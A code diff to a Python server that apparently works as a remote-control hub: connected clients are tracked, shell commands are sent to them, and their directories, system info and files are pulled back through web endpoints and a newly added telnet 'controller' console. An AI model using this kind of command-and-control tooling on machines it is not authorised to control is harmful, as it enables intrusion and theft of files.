@@ -20,15 +20,59 @@ def listen_tcp():
     while True:
         client_socket,address = server.accept() # Accept TCP connection
         conn_name = address[0] + ':' + str(address[1])
-        print('Connection ' + conn_name) # Print connection base info
-        socket_conns[conn_name] = client_socket # add connection to dic
+        recv_data = client_socket.recv(1024)
+        print(recv_data.decode())
+        try:
+            json_head = json.loads(recv_data.decode())
+            print('Step in json')
+            if json_head['type'] == 'client':
+                print('Connection ' + conn_name + '\n - ' + json_head['content']) # Print connection base info
+                socket_conns[conn_name] = client_socket # add connection to dic
+        except json.JSONDecodeError:
+            Telnet(client_socket, address).start()
+
+
+# endregion
+
+# region Telnet connection
+
+class Telnet(threading.Thread):
+    def __init__(self, conn, add):
+        threading.Thread.__init__(self)
+        self.inputstr = ''
+        self.connection = conn
+        self.address = add
+    def run(self):
+        ii = 0
+        self.connection.send(b'Hello controller')
+        self.connection.send(b'\n>')
+        while True:
+            buf = self.connection.recv(1024)
+            if buf.rfind(b'\n') > -1:
+                print("**-" + self.inputstr)
+                return_arr = self.inputstr.split(' ')
+                match return_arr[0]:
+                    case 'list':
+                        func_return = list_connections()
+                        for key in func_return.keys():
+                            self.connection.send(key.encode())
+                    case 'shell':
+                        func_return = exec_shell(conn_address=return_arr[1], command=' '.join(return_arr[2:]))
+                        self.connection.send(func_return.encode('gbk'))
+                self.inputstr = ''
+                self.connection.send(b'\n>')
+            else:
+                self.inputstr += buf.decode()
+            if ii == 0:
+                self.connection.send(buf)
+            ii += 1
+            continue
 
 # endregion
 
 # region - WebAPI
 
-# Receive dynamic length socket data
-def recv_dyn_socket(client, type, content):
+def recv_dyn_socket(client, type, content): # Receive dynamic length socket data
     client.send(json.dumps({
         'type': type,
         'content': content
@@ -63,11 +107,12 @@ def list_connections():
 
 @webapi.get("/shell/{conn_address}") # Execute shell in client
 def exec_shell(conn_address:str, command:str=None):
+    print(conn_address + ':' + command)
     try:
         client = socket_conns[conn_address]
         return recv_dyn_socket(client, 'shell', command)
     except:
-        return 'Undefind client'
+        return 'Client Error : '
 
 
 @webapi.get("/dir/{conn_address}") # List dir in client
@@ -76,7 +121,16 @@ def scan_dir(conn_address:str, path:str=None):
         client = socket_conns[conn_address]
         return recv_dyn_socket(client, 'scandir', path)
     except Exception as e:
-        return 'Undefind client ' + str(e)
+        return 'Client Error : ' + str(e)
+
+
+@webapi.get("/info/{conn_address}") # List dir in client
+def get_info(conn_address:str):
+    try:
+        client = socket_conns[conn_address]
+        return json.loads(recv_dyn_socket(client, 'info', ''))
+    except Exception as e:
+        return 'Client Error : ' + str(e)
 
 
 @webapi.get("/download/{conn_address}") # Download file from client
@@ -93,7 +147,7 @@ def download_file(conn_address:str, path:str=None):
             background=BackgroundTask(lambda: os.remove(temp_file))
             )
     except Exception as e:
-        return 'Undefind client ' + str(e)
+        return 'Client Error : ' + str(e)
 
 #endregion
 
@@ -108,7 +162,8 @@ def client_heartbeat():
                     'type': 'heartbeat'
                 }).encode())
             except socket.error as e:
-                print('Connection lost ' + key + ' : ' + e.strerror)
+                print('Connection lost ' + key + '\n - ' + e.strerror)
+                socket_conns[key].close()
                 socket_conns.pop(key)
         time.sleep(1)
 
@@ -131,6 +186,6 @@ def tcplistener(): # socket tcp service
 
 if __name__ == "__main__":
     if not os.path.exists(os.getcwd() + os.path.sep + 'temp'): os.mkdir(os.getcwd() + os.path.sep + 'temp')
-    fastAPI = threading.Thread(target=fastapi,name='FastAPI').start()
-    tcpListener = threading.Thread(target=tcplistener,name='TCPListener').start()
-    heartbeat = threading.Thread(target=client_heartbeat,name='HeartBeat').start()
+    fastAPI = threading.Thread(target=fastapi, name='FastAPI').start()
+    tcpListener = threading.Thread(target=tcplistener, name='TCPListener').start()
+    heartbeat = threading.Thread(target=client_heartbeat, name='HeartBeat').start()
